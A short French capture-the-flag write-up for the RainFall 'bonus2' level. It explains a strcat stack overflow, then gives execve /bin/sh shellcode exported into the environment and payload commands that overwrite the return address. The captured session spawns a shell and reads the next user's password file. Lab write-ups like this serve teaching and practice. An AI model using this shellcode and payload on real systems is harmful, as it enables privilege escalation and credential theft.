En desassemblant le code on voit qu'il y a un strcat faillible car on peux override l'adresse de retour du main
```gdb
   0x0804850a <+134>:	lea    eax,[ebp+0x8]
   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+141>:	lea    eax,[ebp-0x48]
   0x08048514 <+144>:	mov    DWORD PTR [esp],eax
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    eax,[ebp-0x48]
```
Strcat concatene un tableau de char de 72 octet dans lequel il y a Bonjour dans la langue passé en parametre + av[1]

72 octets de msg + 4 de ebp + 4 de eip

Le payload peux maintenant être construis

On exporte le shell avec des nop dans l'environnement.
```bash
bonus2@RainFall:~$ export SC=$(python -c "print('\x90' * (40-21) + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
```

On récupere l'adresse de SC dans l'environnement

Oxbffffef0

Et on execute le binaire avec le payload construis

```bash
bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ ./bonus2 $(python -c "print('B' * 40)") $(python -c "print('B' * 18 + '\xf0\xfe\xff\xbf')")
Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cat /home/user/bonus4/.pass
...
...
```
On fais passer LANG a "fi" pour pouvoir atteindre le EIP.

L'argument av[1] est copié avec strncpy dans les 40 premier octets du buffer
L'argument av[2] est copié avec strncpy dans e-les 32 octets suivant

19 + 40 + 18 + address de SC pour réecrire EIP